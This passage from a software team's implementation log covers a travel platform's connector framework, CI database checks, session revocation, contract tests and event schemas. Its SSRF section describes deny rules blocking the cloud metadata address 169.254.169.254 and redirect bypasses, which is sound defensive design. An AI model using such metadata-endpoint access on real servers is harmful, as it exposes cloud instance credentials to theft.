Not a new defect — `BR-028` §7 disclosed the two shapes openly at the time. What
had been lost was **ownership**, which is exactly what `BUG-022` was. Now annotated
`— superseded: re-carried to STEP-008`.

### What surprised me

**The guard failed on its own documentation five times.** `STEP-NNN.MM`
placeholders, a quoted BUG-022 carry, a literal `.07` example, the fenced code
block showing the convention, and finally the enhancement-log entry recording all
of the above. Each needed a decision rather than a loosened rule:
placeholders are skipped, prose that *describes* a carry gets an explicit
`carry-exempt` marker (the same shape as `rtl-exempt` in the CSS guard), and the
syntax example now uses the placeholder form so a document explaining the
convention cannot fail on its own example.

That is the false-positive tax `ENH-002` costed, paid explicitly. A check people
learn to click through is worse than none, and the way to avoid it is to make each
exemption a human decision that can be asked about.

### The limit, stated rather than implied

It proves a carry was **considered at closure**, not that the work was **done**.
`— withdrawn: nonsense` passes. Same limit as `BASELINE.md` §3: silence becomes a
specific, recorded, reviewable claim; the claim is not thereby true.

---

## IMPL-035 — STEP-005.01 — Connector framework

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-005, REQ-DATA-002, REQ-DATA-003 |
| Blast radius | [BR-038](blast-radius/BR-038-connector-framework.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `ff28714` — matched HEAD at pre-change |

### What was built

The first code under `services/integrations/`. Six modules and 62 assertions:
egress and SSRF, rate limit and quota, backoff and circuit breaker, a schema gate,
resumable checkpoints, and rotating credentials — composed into one
`HttpConnector`. Python suite 665 → **727**.

### A toolbox would not have satisfied the outcome

§1 asks that "no adapter reimplements resilience". A library of helpers achieves
"no adapter *has to*", which is a weaker claim that lasts until the first adapter
written under deadline imports `httpx` directly.

So the connector owns the client and an adapter is handed a connector, never a
URL. There is no path to an outbound request that skips the controls.

### Hostname allowlisting is not SSRF protection

It is the obvious control and it stops none of the three real cases: DNS rebinding
(public at check time, private at connect time), a redirect from an allowlisted
host, and a host that simply resolves inward through a misconfigured record. All
three pass a name check.

So the check is on the **resolved address**, on **every** address a host returns,
on **every** redirect hop. `169.254.169.254` is the target that matters — AWS, GCP
and Azure all serve instance credentials there — and `DEC-007` need not be decided
for that to be true. The IPv4-mapped form `::ffff:169.254.169.254` is blocked
explicitly because it is neither `is_private` nor `is_link_local` by the standard
library's predicates while resolving to exactly the address being blocked.

### REQ-DATA-003's second clause is the one with teeth

"Must trip a circuit breaker **and must not silently degrade to unmarked stale
data**." The tempting behaviour when a provider is down is to serve the last good
answer; a ferry timetable from yesterday rendered without a staleness marker is a
plausible invalid plan with a citation attached.

`CircuitOpenError` therefore carries no payload — there is no channel through
which a cached value could be returned, and the test asserts that as a property of
the type rather than of one code path.

### What surprised me

**A sentinel drawn from the value's own domain.** `0.0` meant "not yet
initialised" for the token bucket and the quota window, and the tests inject a
clock starting at `0.0` — so the first refill computed zero elapsed time. Three
failures on the first run. Injected time makes that class of bug arrive
immediately rather than in production.

**A mutant survived and it was a real hole.** `follow_redirects=True` on the
production client left all 61 tests green, because every test injects its own
client and the constructor's default was never exercised. `httpx` would have
followed the redirect internally and returned the final response, so hop two would
never reach the egress check — the metadata bypass, reopened, with every redirect
test still passing. **Mutation testing found what more test cases would not have**,
because the gap was in what the suite touched, not in what it asserted.

### What was deliberately deferred

`CheckpointStore` is a **port**, not a table. `DEC-007` has not chosen a platform
and `STEP-006` owns canonical persistence; committing a schema here would decide
someone else's design as a side effect. The in-memory implementation is enough to
prove the commit ordering, which is the part that is easy to get wrong.

The secret manager is likewise a one-method port. The sub-step's §4 asks whether
rotation works without a restart, and that cannot be answered until `DEC-007`
picks one. What is settled now is the shape that makes rotation possible at all —
fetch through a port, cache with a TTL, never a module-level constant — and that
shape does not change with the vendor.

---

## IMPL-034 — STEP-001.07 — Database-backed checks run in CI

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-002, REQ-SEC-001, REQ-SEC-002 |
| Blast radius | [BR-037](blast-radius/BR-037-database-backed-ci.md) (MEDIUM, **confidence MEDIUM**) |
| Commit | see git log for this entry |
| Graph indexed commit | `5cd47bb` — matched HEAD at pre-change |
| Bugs closed | [BUG-023](BUG_REGISTER.md) |

### What was built

PostgreSQL in CI and in `pnpm ci:local`, migrations applied in both, R7 wired into
`pnpm verify`, and the five copies of the skip decision replaced by one. Guard
meta-suite 55 → **61**.

### The bug was not "CI lacks a database"

That was the visible half. CI ran **624 passed / 46 skipped** where local ran
**665 / 5** — forty-one database-backed tests skipping on every push — and
`pnpm test:security` was not in `pnpm verify` at all, so R7 had never run in CI in
the repository's history.

The reason it lasted six steps is the third cause: **the skip decision existed in
five copies**, one per test module. Asking the graph for the blast radius of one
returned `status: ambiguous` with five candidates. Five places taking the same
decision forty-one times a run, none able to change the others, none reporting it.

A fourth cause surfaced while consolidating: the modules read the DSN from **two
different environment variables** — `JOURNEYLAB_DATABASE_URL` in one and
`JOURNEYLAB_TEST_DSN` in four. Setting either in CI would have configured some
modules and left the rest pointed at localhost, producing connection failures in a
subset of tests with nothing explaining why.

### Adding the service is the easy half

On its own it is a fix that regresses silently. Rename the service, change its
health check, move the port — `_stack_up()` returns False and forty-one tests go
back to skipping under a green build.

So the deliverable is the **ratchet**: `JOURNEYLAB_REQUIRE_DB=1`, set in CI and the
mirror, makes a missing database a failure. It exists in two independent layers
(the suite and the `verify` wrapper) and each was seeded separately to prove it
holds alone.

`tests/e2e/smoke.sh` has printed "a skip is not a pass" since STEP-003. This is the
first time anything other than a human reading the output enforces it.

### Keeping `pnpm verify` usable without Docker

R7 exits 2 for "no database", and `&&` treats 2 exactly like 1 — so wiring the
suite in directly would have made the repository's headline command fail on any
machine without the stack running, for a CSS change.

Swallowing the 2 is worse: a green `verify` would then mean "isolation holds **or**
was never checked", which is how `BUG-023` survived.

`tests/guards/tenant-isolation-gate.sh` makes the difference explicit in one
readable place instead of leaving it an emergent property of `&&`: with the flag, a
skip fails; without it, a skip is tolerated and prints a box saying R7 **did not
run** and this is not a pass.

### What surprised me

**My warning box ran a command.** Backticks inside double quotes are command
substitution, so `` echo "│ Run `pnpm dev` …" `` **started the whole Docker stack**
while printing help text. I noticed because four containers reported healthy during
what should have been a message. A guard with a side effect is not a guard — and
this side effect would have masked the exact condition being reported, since after
printing, the database it had just called missing would have been running.

**A meta-test asserted one component's wording rather than the outcome.** The
ratchet lives in both the suite and the wrapper; the suite fires first, so my
assertion looking for the wrapper's message failed against entirely correct
behaviour. Rewritten to assert the outcome, plus a second case that disables the
suite's check to prove the wrapper's holds on its own.

### It found a real defect on its first run

The mirror's first run with a database failed: three tenant-context tests asserting
`count(*) == 1` against rows the **R7 shell script** creates as a side effect. They
passed on every developer machine, because R7 leaves its seed behind, and failed on
a clean schema. `BUG-024`.

Order-dependent on a different suite, in a different language, with nothing
recording the dependency — and invisible for six steps because the only environment
that was both clean and had a database did not exist until this sub-step created
it.

### What this sub-step cannot verify about itself

**The workflow YAML.** GitHub Actions `services:` blocks are interpreted by the
runner; nothing local executes them. `pnpm ci:local` provides its database by a
different mechanism — a container on a user-defined network — so the two paths
verify different things and neither proves the other. `BR-037` §3 records that the
workflow change is verified only by the push that follows, which is why that record
is MEDIUM confidence while the code around it is high.

### What was deliberately left undone

Redis, MinIO, NATS and Jaeger stay out of CI. No test depends on them, and adding
services nothing uses is cost without coverage. When one is needed, it gets the
same ratchet.

---

## IMPL-033 — STEP-002.08 — Server-side session store and revocation

| Field | Value |
| --- | --- |
| Date | 2026-08-12 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003, REQ-SEC-001, REQ-PRIV-001 |
| Blast radius | [BR-036](blast-radius/BR-036-session-revocation.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `5086a8a` — matched HEAD at pre-change |
| Bugs closed | [BUG-022](BUG_REGISTER.md) |
| Enhancements logged | [ENH-002](ENHANCEMENT_LOG.md) — **PENDING**, not implemented |

### What was built

A session can now be ended by the server. Two tables, a store, revocation checked
at validation on both sides of the language boundary, and a cascade from membership
revocation. Python 648 → **665**, web 61 → **63**, R7 12 → **18**.

### Why it did not already exist

`BUG-022`, and it is a process failure rather than a coding one. `.05` recorded
server-side revocation as `PARTIAL` and **carried it to `.07`**. `.07` closed
`VERIFIED` listing four carried gaps — none of them this one. Meanwhile
`session.ts` carried a comment reading *"Server-side revocation is authoritative
and is what actually ends access"*, pointing at something that did not exist.

**Nothing failed, because a carry is prose.** `substep-docs.sh` checks that a
`VERIFIED` sub-step has its three records; it cannot check that a promise made in
one record was kept in another. So signing out cleared cookies and the token
already in the browser kept working, and revoking someone's role stopped their next
authorization check while leaving the token in flight untouched.

That is what left STEP-002 at 5/7 with nothing named that would close it.

### The design question: a guest session has no tenant

`REQ-SEC-001` says every row carries a tenant. A guest session precedes
authentication, so there is none.

A nullable `organization_id` was rejected because the RLS predicate would then have
to special-case NULL, which is the exact shape of a policy that later lets a real
row through. A sentinel "no tenant" organization was rejected because it gives
every guest the same tenant, so a bug leaking across guest sessions would look like
a legitimate same-tenant read.

Two tables. `sessions` is tenant-scoped with `organization_id NOT NULL` and RLS;
`guest_sessions` has no tenant column at all. Each invariant stays true instead of
one being weakened to cover both. The cost is two revocation paths, which is real
and visible rather than hidden in a mode flag.

### A hash format is a cross-language contract

Guest tokens are minted in TypeScript and stored by Python. They agree only if both
produce byte-identical hashes, and **no edge in the graph connects them** —
`BR-025` recorded that the TS/Python boundary is invisible.

A mismatch would surface as `unknown_token`, which is exactly what a forged token
looks like, so the symptom would not point at the cause. The test vector was
therefore generated by **running the TypeScript implementation**; a vector produced
by the code under test proves only that the code agrees with itself.

### Making the field required was worth the churn

`GuestSessionRecord.revokedAt` is `number | null`, required rather than optional.
Optional would let a call site that has not learned about revocation omit it and
get a valid session — the precise failure being fixed. Required meant the compiler
listed all five existing call sites and none could be missed.

### What surprised me

**My first mutation test was invalid and looked fine.** I dropped `FORCE` RLS on
`sessions` in the live database; R7 still passed. The suite **re-applies the
migration before asserting**, so it repaired the drift it then checked. A valid
seed had to go into the migration file. *A suite that heals the condition it tests
cannot fail on it*, and nothing revealed that until someone tried.

**The FORCE-RLS assertion named three tables.** Adding a fourth would have left it
unchecked while still passing — the same pattern as `BUG-021`. It now derives the
set from the schema: every table with an `organization_id` must force RLS. The next
tenant-scoped table is covered by whoever creates it.

**I misread a silent failure as success.** An edit script had `2>/dev/null` on it
and printed nothing; I read the absent success marker as done and moved on. The
files were unchanged. It cost one cycle and it is the same class of error as
trusting a check that cannot fail — the fix is to assert the success marker, not
to look harder.

### What was deliberately left undone

**Not wired into HTTP.** `apps/api` still declares no routes. The store exists and
is tested; connecting it to request handling belongs with the handlers in STEP-004.

**`.04`'s trip re-parenting stays partial**, blocked on the `trips` table in
STEP-007. Blocked, not forgotten, and now the only partial left in STEP-002.

**`ENH-002` is logged, not built.** A guard that parses carries and fails when a
sub-step closes without discharging them would have caught `BUG-022` — but building
a documentation guard inside a security sub-step is the widening the enhancement
log exists to prevent, and `ENH-001` was held to the same rule days earlier.

---

## IMPL-032 — STEP-004.08 — Backward-compatibility and consumer contract tests

| Field | Value |
| --- | --- |
| Date | 2026-08-12 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-008 |
| Blast radius | [BR-035](blast-radius/BR-035-compatibility-tests.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `eb30a26` — matched HEAD at pre-change |
| Bugs closed | [BUG-021](BUG_REGISTER.md) |
| Enhancements logged | [ENH-001](ENHANCEMENT_LOG.md) — **PENDING owner decision**, not implemented |

### What was built

A breaking contract change now fails the build unless it carries a major version
bump. `tools/contract_diff.py` classifies, `tools/check_compatibility.py` decides,
`contracts/baseline/` is what it compares against, and
`tests/contracts/test_consumer_contracts.py` records what a consumer relies on.

Python suite 592 → **648**. Guard meta-suite 47 → **55**.

### The whole idea is that direction decides the verdict

Request and response schemas have **opposite** compatibility rules. Adding a
required property breaks every client of a request and is harmless in a response.
Making a required property optional is a courtesy in a request and breaks every
consumer of a response. Every rule inverts.

So the classifier does not look at schemas in isolation. It walks from the
operations, records which position each schema is reachable in, and applies the
matching ruleset — with a schema reachable from both, like `Money` and `Problem`,
checked under both and taking the worse verdict.

Half the tests are written as pairs asserting **opposite** severities for the same
structural edit. That shape was chosen because the two obvious wrong
implementations both pass half a normal suite: a direction-blind classifier gets
one of each pair right, and a classifier that calls everything breaking gets every
breaking case right. Neither survives the pairs.

### The audit I promised at .07, and what it cost to keep

The `.07` record committed `.08` to hunting the existence-versus-capability
assertion pattern deliberately. That hunt found **two real defects** (BUG-021):
`JobEvent.sequence` and `ScenarioSetGenerated.model_versions` were optional while
their own descriptions promised gap detection and reproducibility.

`sequence` is the one worth remembering. In a stream where some events carry a
sequence and some do not, **a missing number proves nothing** — you cannot tell a
dropped event from an event that never had one. Optional sequencing does not weaken
gap detection, it removes it, while looking exactly like it is there.

Four sub-steps of ordinary work had not surfaced these. Twenty minutes of grepping
`assert "x" in ...properties` did. **The pattern is findable when hunted and
invisible when not**, which is the argument for scheduling audits rather than
relying on noticing.

### Three mistakes of my own, and one of them twice

**I asserted a threshold instead of a property.** My orphan-schema test asserted
`len(orphans) <= 2` and failed on three. Raising it to 3 would have gone green and
tested nothing — the same defect I was auditing for, committed while auditing for
it. The real property is that an unreferenced schema must be a bare `$ref` alias
(a named export) rather than an inline definition nobody references.

**I named a schema that does not exist.** The consumer expectations referenced
`TripCreate`; the contract calls it `CreateTripRequest`. Written from my assumption
of the contract rather than from the contract, which is the exact failure named in
the STEP-003 e2e work.

**My tool reported "no differences" about a contract I had just changed.** The
classifier treated safe required-ness changes as nothing to report, so tightening
`JobEvent.required` produced the output *"no differences from the baseline"*. The
verdict was right and the report was a lie, and a reader trusts the report. Safe
and absent are different answers; both directions are now reported, additive ones
included.

### The bypass, and the limit of what a guard can do about it

Any compatibility gate can be defeated by moving the baseline. `BASELINE.md`
records a digest of the snapshot and the gate recomputes it, so a moved baseline
fails the build.

This does not make the bypass impossible — the author can edit both files — and
`BASELINE.md` §3 says so in those words. What it does is convert a silent edit into
**a claimed release that did not happen**: a specific, recorded, reviewable false
statement. Writing that limitation into the artefact seemed better than letting the
next reader assume the check is stronger than it is.

The digest is used instead of git history because `git diff HEAD` cannot see an
uncommitted baseline, answers differently either side of the commit that introduces
one, and needs history a shallow CI clone does not have — the same argument that
chose a committed snapshot over a git tag.

### What was deliberately left undone

**AsyncAPI is not diffed.** Event compatibility turns on delivery semantics and
`DEC-009` is open; writing the rules now would bake in the assumption this
repository has refused to make. The snapshot includes `asyncapi.yaml` so the
baseline is complete. Carried to `STEP-006`.

**Semantic change is not detected** — `CONTRACT_CHANGE_POLICY` §1's most dangerous
category, invisible to a structural diff by construction. `ENH-001` proposes
detecting the *documented* subset via description drift and is **logged, not built**:
the enhancement log's rule 1 says an enhancement is never implemented silently
inside another sub-step, and its real risk is teaching people to click through a
warning.

---

## IMPL-031 — STEP-004.07 — Client generation and no-hand-edit enforcement

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-007 |
| Blast radius | [BR-034](blast-radius/BR-034-generated-clients.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `73a2780` — matched HEAD at pre-change |
| Bugs closed | [BUG-020](BUG_REGISTER.md) |

### What was built

`contracts/openapi.yaml` stopped being a document that tests read and became a
source that code is built from. `tools/gen_clients.py` emits a TypeScript client
(2,022 lines) and a Python one (71 Pydantic classes) from the single contract.

Enforcement is `tests/guards/generated-clients.sh`: regenerate, then diff. It
catches a hand-edited client and a stale one with the same check and **cannot tell
them apart** — which is correct, because both mean the committed client is not what
the contract describes, and the remedy is identical.

### Why not a "DO NOT EDIT" header

A header is advice. Somebody editing a generated file to fix an urgent bug keeps
the header, and the next regeneration reverts their fix **silently** — worse than
either failing or succeeding, because the fix disappears without a trace and the
bug returns. The guard fails the build instead.

### The generator found a contract defect that 470 assertions had read past

`Evidenced.conflicts[].source` was `{type: object}` and emitted as
`Record<string, never>` — a conflicting source that cannot state who it is.
BUG-020, fixed here by composing the entry from the same shared schemas as the
claim it disputes.

Every Python test agreed the contract was fine, because they were reading the same
document that was wrong. The generator produced a **different representation**, and
`Record<string, never>` is a shape a human notices instantly. Generating a client
is not only a delivery mechanism; it is a second reader of the contract.

The test that missed it asserted `"conflicts" in properties` — a key, not a
capability. That is now the fourth assertion in this step written against the
existence of a thing rather than the property the requirement names (`.02`, `.03`,
`.06`, and this one). It has stopped being a coincidence and is called out in the
sub-step record as something `.08` should look for deliberately.

### The TypeScript side had no tests, and `tsc` was not one

`tsc --noEmit` proves the generated file parses. It would pass just as happily if
every schema had collapsed to `unknown` — which is a live risk, because `.06` moved
four schemas into external `$ref`s and an unresolved external ref **degrades rather
than errors**. `Money` becoming `unknown` would typecheck cleanly here and then
accept a float at every call site in the product.

`packages/contracts/src/contract.assert.ts` holds 8 assertions written with an
`Exact<>` helper rather than `extends`, because `extends` is satisfied by `unknown`
on the right-hand side — precisely the degradation being guarded against. All 8
were mutation-tested: each was seeded with a plausible wrong type and each failed
the build.

### Third time the missing compiler API has broken a tool

`openapi-typescript` v7 builds output through `ts.factory.*`. TypeScript 7 ships
no JavaScript compiler API (`ADR-009`). Pinned to v6, with the reason recorded at
the pin. BUG-017 was Next's type-check step, BUG-018 the token generator. Three
tools assuming a JavaScript compiler API exists is a property of the ecosystem, not
bad luck — and the next generator added to this repository should be checked for it
before it is chosen, not after.

### What surprised me

**The Python generator emits a header it never checks.** `--custom-file-header` is
inserted verbatim, so a plain prose header produced a module that failed at import
with `SyntaxError: invalid character '—'`. The generator does not verify that its
own output parses.

**I copied a tsconfig from a package with nothing in common with this one** —
`types: ["node"]` without the dependency, `jsx` with no components, and
`allowImportingTsExtensions` for tooling that does not exist here. `TS2688` on the
first typecheck. Copying configuration is how a package acquires requirements
nobody chose.

**`package.json` exported a file that did not exist.** Nothing imported the package,
so nothing failed. A broken entry point stays invisible until the first consumer,
which is the worst possible moment to discover it.

**The graph exclusion works and my control is not what makes it work.** The
requirement is met — at `7b1489e` a Cypher query returns no nodes under either
generated path. But `.gitnexusignore` is not the cause: adding and removing the
generated directories from it produces an identical index (353 files, 5,702 nodes,
7,993 edges), because **GitNexus already skips `generated/` by default**.

The file is not broken. A control probe — ignoring `tools/gen_clients.py` instead —
removed 16 nodes, so the mechanism is functional and the null result is real rather
than a mis-written pattern. That probe is the only reason the other two measurements
mean anything.

I nearly shipped this as "exclusion verified", which would have been true of the
outcome and false about the cause, and the difference shows up the day somebody
relies on the file to exclude something new. It is kept — a default is somebody
else's decision and can change — but BR-034 §4 now says what it does and does not
do.

### What was deliberately left undone

**AsyncAPI generates nothing.** `DEC-009` (queue versus Kafka) is open and the event
client's delivery semantics depend on it. Generating one now would bake in an
assumption this repository has explicitly refused to make. Carried to `STEP-006`.

---

## IMPL-030 — STEP-004.06 — Shared JSON Schemas including model-output schemas

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-AI-002 (enforcing REQ-AI-001, REQ-AI-004, ADR-002) |
| Blast radius | [BR-033](blast-radius/BR-033-json-schema-library.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `e1d3194` — matched HEAD at pre-change |

### What was built
Five shared schemas in `contracts/jsonschema/`, `openapi.yaml` refactored to
reference four of them, and the AI-001 model-output schema. 40 assertions.
Python suite 552 → **592**.

### The sub-step was a refactor and I nearly missed it
§5 asks for "reuse enforced — no duplicate inline definitions". Creating the
library alone would have **produced** the duplication it forbids: `Money` and the
provenance and time fields were already inline in `openapi.yaml`, put there by
`.01` and `.02` when nothing else needed them.

So `.06` had to change contracts already marked `VERIFIED`. `Evidenced` moved
from restating `source`, `confidence` and the three time fields to composing
`Provenance` and `TemporalValidity`. Equivalent in shape, but its required set
changed — which under `CONTRACT_CHANGE_POLICY` is **breaking the moment a
consumer exists**. Nothing consumes it yet, and `.07` generates clients next.
Doing it now rather than after was the whole difference between a refactor and a
migration.

**One of the two broken tests would have gone vacuous rather than red** had I only
added the library. It read `schemas["Money"]["properties"]`, and after a bare
`$ref` there are no `properties` — so the assertion would have iterated an empty
set and passed. It now asserts the `$ref` exists first, then follows it.

### The model-output schema is where "never" becomes enforceable
`ADR-002` gives feasibility to deterministic engines and language to the model.
`REQ-AI-001` says model output can never mutate trip state without validation.
`trip-brief-extraction.json` is where that stops being a sentence.

**`source_span` is required, and it is the most useful field in the file.** A
model claiming the traveller is "travelling with a dog" must point at the
characters that say so. An extraction whose span does not contain its claim is
caught by a deterministic check rather than by the reader's memory of what they
typed — which is the only defence against a fluent hallucination that nobody
actively disbelieves.

`additionalProperties: false` everywhere, so an unexpected `tool_call` is
rejected rather than ignored: a model returning a field we did not ask for is a
model doing something we did not design, and ignoring it means never finding out.

**Confidence is per field, not per extraction.** A model can be certain about the
dates and guessing about the accessibility requirement; one number averages those
into something true of neither, and the interface then shows one badge while the
traveller cannot tell which half to check.

`value` is deliberately untyped. The deterministic validators own date, currency
and unit parsing — a schema that accepted the model's own idea of a date would be
trusting the thing it exists to check.

### What the schema cannot do, written into the schema
It checks shape, not truth. It cannot tell whether "2 hours" was really said or
whether "step-free" meant the hotel or the ferry. It is the **first gate of
three**: schema, then deterministic validators, then the human confirmation
`AI-001` requires.

A test asserts that sentence is present in the description, because a reader who
believes the schema validates meaning will skip the two gates that follow it.

### The three time axes, kept apart
`observed_at` (the source said it), the effective window (it is true in the
world), `recorded_at` (we wrote it down). A ferry timetable observed in March,
effective until October, recorded in April is not stale in June — and a system
with one timestamp cannot express that. It will either discard good data or serve
expired data, depending on which meaning the single field happened to get.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Generate clients from these schemas | STEP-004.07 |
| Unify the AsyncAPI envelope with this library — **not claimed here** | STEP-004.08 or STEP-006 |
| Prompt content and retrieval configuration | STEP-009 |

---

## IMPL-029 — STEP-004.05 — AsyncAPI event contracts (EVT-001…008)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-006, REQ-DATA-008 (enforcing REQ-SEC-001, REQ-PRIV-006/007, REQ-CONS-006) |
| Blast radius | [BR-032](blast-radius/BR-032-asyncapi-events.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `d2f950b` — matched HEAD at pre-change |

### What was built
`contracts/asyncapi.yaml` — eight events, one shared envelope, and an explicit
delivery guarantee, partition key, retention and replay note on each. 60
assertions. Python suite 492 → **552**.

### "No content in payloads" is a tenancy control, not privacy tidiness
`EVENT_CONTRACTS.md` §1 requires payloads to carry IDs, versions and
classifications only. That reads like a preference. It is not.

**An event is read by consumers that never authenticated the user who caused
it.** `EVT-001` alone reaches evidence assembly, the knowledge graph and
analytics. A payload carrying constraint values hands all three data nobody
checked they may see — and the check cannot be retrofitted, because the data is
already in the log and in every replica of it.

So payloads carry IDs, and a consumer needing content reads it back through an
authorized API where the boundary is applied per request. Asserted by scanning
every payload property against 24 content-shaped names across all eight events,
plus a meta-test proving the scan finds a seeded `accessibility_needs`. Payloads
are additionally closed.

`EVT-001` is the clearest case. A constraint is the traveller's own words about
their accessibility needs, their budget and who they travel with. **The event
carries four integers.**

### The guarantee that is usually stated wrongly
`exactly-once-effect`, not `exactly-once`. No transport gives exactly-once
delivery; anything claiming to is deduplicating somewhere and calling it a
guarantee. What is required is that the **effect** happens once, which is the
consumer's obligation — so the contract names the obligation rather than implying
the transport absorbs it.

Three events carry it, and they are the three where a duplicate does real damage:
a second booking handoff, a repair applied twice, a corrupted audit trail.
Everywhere else a duplicate is merely wasteful.

### Two events are deliberately not keyed by trip
A deletion request spans every trip a subject has; provider health is not a
property of a trip at all. Keying either by `trip_id` would look consistent and
be wrong — and the failure would be a rare, load-dependent ordering bug.

### The deletion event outlives what it describes
`EVT-007` is the proof artifact for `REQ-PRIV-006`, retained for a legally
required minimum — longer than the data whose destruction it records. So
`subject_ref` is **pseudonymous**, and a test asserts no `user_id` or `email`
appears: a proof of deletion carrying the person's identity defeats the act it
proves.

Failure reasons are codes, not prose, because a prose reason eventually contains
the row it failed on. And failure **emits** rather than staying silent — silence
is indistinguishable from a crashed producer.

### DEC-009 confirmed rather than assumed
The sub-step asked to confirm that queue-versus-Kafka changes the transport and
not the contract. It does, and that is now **enforced**: no `servers` block, no
channel `bindings` — the two places AsyncAPI lets a transport leak in — with a
test asserting both absences. Answering DEC-009 later cannot quietly bind the
contract to the answer.

### A pre-change check with no applicable query
This sub-step adds one YAML document and one test module and changes no Python
symbol. I ran `detect_changes()` and recorded that **no symbol-level query was
applicable**, rather than running an irrelevant one to produce a LOW. The protocol
asks for a pre-change check, not for a query, and a number obtained by asking the
wrong question is worse than an honest absence.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Transactional outbox that refuses an unstamped envelope | STEP-006 |
| Consumer implementations | Their own steps |
| `DEC-009` — managed queue or Kafka | Before STEP-006 |

---

## IMPL-028 — STEP-004.04 — Privacy, admin, coverage and job operations (API-015…018)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-PRIV-005 (enforcing REQ-PRIV-006/007, REQ-EVID-006, REQ-NFR-004) |
| Blast radius | [BR-031](blast-radius/BR-031-platform-operations.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `6ea8436` — matched HEAD at pre-change |

### What was built
Six operations and 8 schemas: privacy requests with per-store tracking, curator
overrides with four-eyes, public coverage, and job streaming with cancellation.
23 assertions. Python suite 469 → **492**. STEP-004 is now 4/8 with **22
operations declared**.

### The graph gave me a confidently wrong answer
`impact(CLIENT_VISIBLE)` returned **`0 impacted`, `risk: LOW`, `epistemic:
exact`** for a constant with five references across two files.

**That is worse than the degraded concept search**, and worth being precise
about. The FTS gap at least emits a warning. This emits a guarantee: a pre-change
check targeting a module-level constant reports a clean blast radius for a symbol
with real dependents, and `epistemic: exact` invites the reader to stop looking.

Six limitations are now recorded across BR-024 through BR-031: workspace aliases,
JSX components, CSS, the concept search, duplicate indexing, and now imported
constants. Functions are traced correctly and usefully — `impact(problem)` and
`impact(safe_detail)` both returned real callers and processes. **The tool is
reliable for one shape of symbol and silently unreliable for several others**, and
a `0 impacted` result is only trustworthy for a Python function.

### Correcting something I said
I stated that `auth/errors.py` would migrate to RFC 9457 at `.04` and that
invitation redemption would land here. **Neither is true.** `.04` is privacy,
admin, coverage and jobs, and STEP-004 declares contracts only — no route handler
exists anywhere in the repository, so a migration has nothing to be verified
against. Both carry to the implementing steps.

### One public operation, counted rather than assumed
`getCoverage` is the only operation that declares `security: []`. A test **counts
them**, so a second one added by accident is visible rather than inherited.

Public is right: a traveller must be able to learn their destination is
unsupported without registering to be told no. What must not leak is *how* it is
supplied — so `provider_health` is a single aggregate enum, never a list, a name
or a count, each of which reveals the shape of the supply chain. `Coverage` and
`CoverageRegion` are closed, and a test asserts eight leak-shaped names are absent
rather than that the current fields look acceptable.

### Privacy made verifiable rather than assertable
`REQ-PRIV-006` names seven stores — primary, object, vector, graph, cache, export,
token. The record tracks each individually.

A single `complete` boolean goes true when the easy stores finish. `partially_failed`
is therefore a distinct state: six of seven is not complete, and calling it
complete is precisely the failure `REQ-PRIV-007` guards against. Acceptance is
`202` and never `200`, because the work continues after the response.

### A control the organisation cannot currently satisfy
`status` is absent from the override request schema, which is closed — a caller
that could ask for `active` could skip four-eyes. The server decides, and
high-impact overrides are created `pending_approval`.

The contract names a **second curator**, matching the authorization matrix.
`DEC-010` has not resolved whether an `ops_admin` may stand in, so the contract
declares only what the matrix states.

**With a single owner, four-eyes is structurally unsatisfiable** (`ADR-010`). The
contract declares the control correctly; satisfying it is an organisational
problem `STEP-021` cannot ship without.

### Heartbeats are the design, not a detail
Without them a client cannot distinguish a job that is thinking from a connection
that died — and a traveller watching a spinner cannot either. The stream also
carries warnings, because a generation that succeeded while three providers were
degraded is not the same as one that succeeded cleanly. Cancellation is `202`, not
`204`: a job stops at a safe point, and claiming it already has is a lie the
client acts on.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Migrate `auth/errors.py` once handlers exist | STEP-008 onward |
| Invitation redemption + the `invitation_expired` 403 conflict | STEP-015 |
| `DEC-010` — may an `ops_admin` be the second approver? | Before STEP-021 |
| Six graph limitations | STEP-026 |

---

## IMPL-027 — STEP-004.03 — Collaboration, booking, live and feedback (API-010…014)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005 (enforcing REQ-BOOK-004, REQ-SEC-008, REQ-CONS-011, REQ-PRIV-003, REQ-EVID-003) |
| Blast radius | [BR-030](blast-radius/BR-030-collab-booking-live-feedback.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `dd01499` — matched HEAD at pre-change |

### What was built
Seven operations and 11 schemas covering invitations, booking handoff,
activation, repair generation and acceptance, and feedback. 29 assertions.
Python suite 440 → **469**. Phase 2–3 surfaces, specified now so later steps
implement against a stable shape instead of inventing one.

### The absence of a field is the control
`TST-BOOK-002` asks that no schema permit a payment credential. The assertion
scans **every property name in the whole document** against 21 payment-shaped
names, rather than reviewing the booking schemas — review is what fails on the
eighteenth operation added two years from now.

A test that searches for something absent passes identically when the search is
broken, so a second test seeds `card_number` into a synthetic document and
requires the same walk to find it. `BookingHandoff` is also a **closed** object,
